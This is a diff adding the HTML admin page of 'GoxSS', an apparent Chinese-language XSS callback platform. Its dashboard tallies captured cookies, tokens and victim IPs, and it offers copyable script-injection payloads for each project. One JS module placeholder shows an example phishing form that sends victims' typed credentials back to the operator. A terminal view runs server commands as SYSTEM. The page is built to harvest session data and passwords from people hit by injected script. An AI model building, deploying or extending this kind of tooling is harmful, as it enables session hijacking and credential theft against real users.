@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoxSS · XSS 回显管理平台</title>
+    <link rel="stylesheet" href="{{BASE}}/static/style.css">
+</head>
+<body>
+<script>window.GOXSS_BASE = "{{BASE}}";</script>
+<div class="layout">
+
+    <!-- ══════════ 侧边栏 ══════════ -->
+    <aside class="sidebar">
+        <div class="brand">
+            <div class="logo-mark">G</div>
+            <div class="brand-text">
+                <span class="logo">GoxSS</span>
+                <span class="sub">XSS 回显平台</span>
+            </div>
+        </div>
+
+        <nav class="nav">
+            <a class="nav-item active" href="#" data-view="dashboard">
+                <svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
+                <span>总览</span>
+            </a>
+            <a class="nav-item" href="#" data-view="records">
+                <svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h10v2H4z"/></svg>
+                <span>回显记录</span>
+                <span class="nav-badge" id="navBadge" data-zero="1">0</span>
+            </a>
+            <a class="nav-item" href="#" data-view="projects">
+                <svg viewBox="0 0 24 24"><path d="M3 5h6v6H3zm8 0h10v6H11zM3 13h6v6H3zm8 0h10v6H11z"/></svg>
+                <span>项目管理</span>
+                <span class="nav-badge badge-blue" id="projBadge" data-zero="1">0</span>
+            </a>
+            <a class="nav-item" href="#" data-view="jsmodules">
+                <svg viewBox="0 0 24 24"><path d="M9.4 16.6 4.8 12l4.6-4.6L8 6l-6 6 6 6zm5.2 0 4.6-4.6-4.6-4.6L16 6l6 6-6 6z"/></svg>
+                <span>JS 模块</span>
+                <span class="nav-badge badge-blue" id="jsBadge" data-zero="1">0</span>
+            </a>
+            <a class="nav-item" href="#" data-view="shell">
+                <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zM7.4 14.6 6 13.2 8.2 11 6 8.8 7.4 7.4l3.6 3.6zm3.6 1.4h5v-2h-5z"/></svg>
+                <span>终端</span>
+            </a>
+        </nav>
+
+        <div class="sidebar-foot">
+            <div class="live-dot"></div>
+            <span id="status" class="live-text">监听中 :8080</span>
+        </div>
+    </aside>
+
+    <!-- ══════════ 主区域 ══════════ -->
+    <div class="main">
+
+        <header class="pagebar">
+            <div>
+                <h1 class="page-title" id="viewTitle">总览</h1>
+                <p class="page-desc" id="viewDesc">实时捕获的 XSS 回显与敏感信息</p>
+            </div>
+            <div class="pagebar-actions">
+                <button id="changePassBtn" class="btn ghost-btn">修改密码</button>
+                <button id="clearBtn" class="btn danger-btn">清空记录</button>
+                <button id="logoutBtn" class="btn ghost-btn">退出登录</button>
+            </div>
+        </header>
+
+        <!-- ═══ 总览 ═══ -->
+        <section class="view" id="view-dashboard">
+            <div class="stat-grid">
+                <div class="stat-card">
+                    <div class="stat-icon icon-blue">
+                        <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm1 15h-2v-2h2zm0-4h-2V7h2z"/></svg>
+                    </div>
+                    <div class="stat-meta"><span class="stat-num" id="statTotal">0</span><span class="stat-label">总回显数</span></div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon icon-green">
+                        <svg viewBox="0 0 24 24"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 0 1 6 0v3z"/></svg>
+                    </div>
+                    <div class="stat-meta"><span class="stat-num" id="statTokens">0</span><span class="stat-label">捕获 Token</span></div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon icon-red">
+                        <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm.9 15h-1.8v-1.8h1.8zm0-3.6h-1.8V7h1.8z"/></svg>
+                    </div>
+                    <div class="stat-meta"><span class="stat-num" id="statCookies">0</span><span class="stat-label">捕获 Cookie</span></div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon icon-purple">
+                        <svg viewBox="0 0 24 24"><path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4zm0 2c-4 0-8 2-8 4v2h16v-2c0-2-4-4-8-4z"/></svg>
+                    </div>
+                    <div class="stat-meta"><span class="stat-num" id="statIPs">0</span><span class="stat-label">独立 IP</span></div>
+                </div>
+            </div>
+
+            <div class="grid-2">
+                <div class="card chart-card">
+                    <h3 class="card-title">回显趋势（近 10 分钟）</h3>
+                    <canvas id="chart" width="620" height="200"></canvas>
+                </div>
+                <div class="card payload-card">
+                    <h3 class="card-title">注入 Payload</h3>
+                    <p class="hint">选择项目并复制注入脚本：</p>
+                    <select id="quickProj" class="select"></select>
+                    <div class="code-row">
+                        <code id="payload">&lt;script src="..."&gt;&lt;/script&gt;</code>
+                        <button id="copyBtn" class="btn">复制</button>
+                    </div>
+                    <div class="hint-row">
+                        <span class="hint">测试流程：复制 payload → 打开</span>
+                        <a class="link" href="/demo" target="_blank">演示受害页 ↗</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══ 回显记录 ═══ -->
+        <section class="view hidden" id="view-records">
+            <div class="card table-card">
+                <div class="table-head">
+                    <h3 class="card-title">回显记录</h3>
+                    <div class="head-right">
+                        <select id="filterProj" class="select slim"></select>
+                        <input id="search" class="search" type="text" placeholder="搜索 IP / URL / Token …">
+                    </div>
+                </div>
+                <div class="table-scroll">
+                    <table>
+                        <thead>
+                        <tr>
+                            <th>序号</th><th>时间</th><th>项目</th><th>来源 IP</th>
+                            <th>页面 URL</th><th>Cookie</th><th>Token</th><th>浏览器</th><th></th>
+                        </tr>
+                        </thead>
+                        <tbody id="hits">
+                        <tr><td colspan="9" class="empty">暂无回显数据</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══ 项目管理 ═══ -->
+        <section class="view hidden" id="view-projects">
+            <div class="grid-2 projects-grid">
+                <div class="card">
+                    <h3 class="card-title">新建项目</h3>
+                    <div class="field-row">
+                        <label>项目名称 *</label>
+                        <input id="newName" class="input" type="text" placeholder="例如：商城站留言板 XSS">
+                    </div>
+                    <div class="field-row">
+                        <label>备注</label>
+                        <input id="newDesc" class="input" type="text" placeholder="注入点位置、目标站等说明">
+                    </div>
+                    <div class="field-row">
+                        <label>选择 JS 模块（可多选，随 payload 依次下发）</label>
+                        <div id="newJSList" class="js-check-list">
+                            <span class="muted">加载中…</span>
+                        </div>
+                        <p class="hint" style="margin-top:6px">没有想要的模块？去「JS 模块」页新建自己的 JS / 钓鱼页面。</p>
+                    </div>
+                    <button id="createBtn" class="btn primary-btn">＋ 创建项目</button>
+                </div>
+
+                <div class="card table-card proj-table">
+                    <div class="table-head"><h3 class="card-title">项目列表</h3></div>
+                    <div class="table-scroll table-scroll-inner">
+                        <table>
+                            <thead>
+                            <tr><th>项目 ID</th><th>名称</th><th>备注</th><th>回显数</th><th>JS 模块</th><th>创建时间</th><th></th></tr>
+                            </thead>
+                            <tbody id="projRows">
+                            <tr><td colspan="7" class="empty">暂无项目</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card payload-card" style="margin-top:18px">
+                <h3 class="card-title">项目 Payload</h3>
+                <div class="field-row-inline">
+                    <select id="projSelect" class="select"></select>
+                    <button id="copyBigBtn" class="btn">复制 Payload</button>
+                </div>
+                <div class="code-row column"><code id="payloadBig">&lt;script&gt;&lt;/script&gt;</code></div>
+            </div>
+        </section>
+
+        <!-- ═══ JS 模块 ═══ -->
+        <section class="view hidden" id="view-jsmodules">
+            <div class="grid-2 projects-grid">
+                <div class="card">
+                    <h3 class="card-title">新建 JS 模块</h3>
+                    <div class="field-row">
+                        <label>模块名称 *</label>
+                        <input id="newJSName" class="input" type="text" placeholder="例如：我的钓鱼页面">
+                    </div>
+                    <div class="field-row">
+                        <label>描述</label>
+                        <input id="newJSDesc" class="input" type="text" placeholder="这个 JS / 钓鱼页面做什么">
+                    </div>
+                    <div class="field-row">
+                        <label>JS 代码（每个模块独立下发，互不干扰；用 __goxssSend({...}) 回传数据）</label>
+                        <textarea id="newJSCode" class="textarea code-textarea" rows="10" spellcheck="false"
+                                  placeholder="// 例如一个钓鱼页面：
+(function(){
+  var w = document.createElement('div');
+  w.innerHTML = '<form>...你的钓鱼表单...</form>';
+  document.body.appendChild(w);
+  w.querySelector('form').addEventListener('submit', function(e){
+    e.preventDefault();
+    __goxssSend({ extra: '凭据: ' + new FormData(e.target).entries().next().value[1] });
+  });
+})();"></textarea>
+                    </div>
+                    <button id="createJSBtn" class="btn primary-btn">＋ 创建模块</button>
+                </div>
+
+                <div class="card table-card proj-table">
+                    <div class="table-head"><h3 class="card-title">模块列表</h3></div>
+                    <div class="table-scroll table-scroll-inner">
+                        <table>
+                            <thead>
+                            <tr><th>模块 ID</th><th>名称</th><th>描述</th><th>代码</th><th>创建时间</th><th></th></tr>
+                            </thead>
+                            <tbody id="jsRows">
+                            <tr><td colspan="6" class="empty">暂无模块</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- ═══ 终端 ═══ -->
+        <section class="view hidden" id="view-shell">
+            <div class="card terminal-card">
+                <div class="table-head">
+                    <h3 class="card-title">服务器终端</h3>
+                    <span class="hint" id="shellHint">以服务运行账户（NSSM 下为 SYSTEM）执行 · 60 秒超时</span>
+                </div>
+                <div id="term" class="term">
+                    <div class="term-line term-info">GoxSS 管理终端已就绪。输入命令回车执行；↑/↓ 翻阅历史。</div>
+                </div>
+                <div class="term-input-row">
+                    <span class="term-ps">λ</span>
+                    <input id="cmdInput" class="term-input" type="text" autocomplete="off" autocapitalize="off" spellcheck="false"
+                           placeholder="输入命令，例如：tasklist /fi &quot;imagename eq x.exe&quot;">
+                    <button id="clearTerm" class="btn ghost-btn">清屏</button>
+                </div>
+            </div>
+        </section>
+    </div>
+</div>
+
+<!-- ══════════ 项目编辑弹窗（选择 JS 模块） ══════════ -->
+<div id="modal" class="modal hidden">
+    <div class="modal-card wide">
+        <div class="modal-head">
+            <h3>编辑项目 <span class="pill" id="editId"></span></h3>
+            <button id="modalClose" class="icon-btn">✕</button>
+        </div>
+        <div class="modal-body">
+            <div class="field-row">
+                <label>项目名称</label>
+                <input id="editName" class="input" type="text">
+            </div>
+            <div class="field-row">
+                <label>备注</label>
+                <input id="editDesc" class="input" type="text">
+            </div>
+            <div class="field-row">
+                <label>选择 JS 模块（可多选，按勾选顺序随 payload 依次下发）</label>
+                <div id="editJSList" class="js-check-list">
+                    <span class="muted">加载中…</span>
+                </div>
+            </div>
+            <div class="modal-foot">
+                <button id="saveProj" class="btn primary-btn">保存</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ══════════ JS 模块编辑弹窗 ══════════ -->
+<div id="jsModal" class="modal hidden">
+    <div class="modal-card wide">
+        <div class="modal-head">
+            <h3>编辑 JS 模块 <span class="pill" id="editJSId"></span></h3>
+            <button id="jsModalClose" class="icon-btn">✕</button>
+        </div>
+        <div class="modal-body">
+            <div class="field-row">
+                <label>模块名称</label>
+                <input id="editJSName" class="input" type="text">
+            </div>
+            <div class="field-row">
+                <label>描述</label>
+                <input id="editJSDesc" class="input" type="text">
+            </div>
+            <div class="field-row">
+                <label>JS 代码（保存后所有选择该模块的项目立即生效）</label>
+                <textarea id="editJSCode" class="textarea code-textarea" rows="14" spellcheck="false"></textarea>
+            </div>
+            <div class="hint-row">
+                <span class="hint">说明：数据通过 __goxssSend({ extra: ... }) 回传，显示在回显记录的“附加数据”中。</span>
+            </div>
+            <div class="modal-foot">
+                <button id="saveJS" class="btn primary-btn">保存模块</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ══════════ 修改密码弹窗 ══════════ -->
+<div id="passModal" class="modal hidden">
+    <div class="modal-card narrow">
+        <div class="modal-head">
+            <h3>修改密码</h3>
+            <button id="passClose" class="icon-btn">✕</button>
+        </div>
+        <div class="modal-body">
+            <div class="field-row">
+                <label>当前密码</label>
+                <input id="passOld" class="input full" type="password" autocomplete="current-password">
+            </div>
+            <div class="field-row">
+                <label>新密码（至少 6 位）</label>
+                <input id="passNew" class="input full" type="password" autocomplete="new-password">
+            </div>
+            <div class="field-row">
+                <label>确认新密码</label>
+                <input id="passConfirm" class="input full" type="password" autocomplete="new-password">
+            </div>
+            <p id="passErr" class="login-error hidden"></p>
+            <div class="modal-foot">
+                <button id="passSave" class="btn primary-btn">确认修改</button>
+            </div>
+            <p class="hint" style="margin-top:10px">修改成功后所有登录会话将失效，需要重新登录。</p>
+        </div>
+    </div>
+</div>
+
+<!-- ══════════ 回显详情弹窗 ══════════ -->
+<div id="detail" class="modal hidden">
+    <div class="modal-card">
+        <div class="modal-head">
+            <h3>回显详情 <span class="pill" id="modalSeq"></span></h3>
+            <button id="detailClose" class="icon-btn">✕</button>
+        </div>
+        <pre id="modalBody"></pre>
+    </div>
+</div>
+
+<script src="{{BASE}}/static/app.js"></script>
+</body>
+</html>
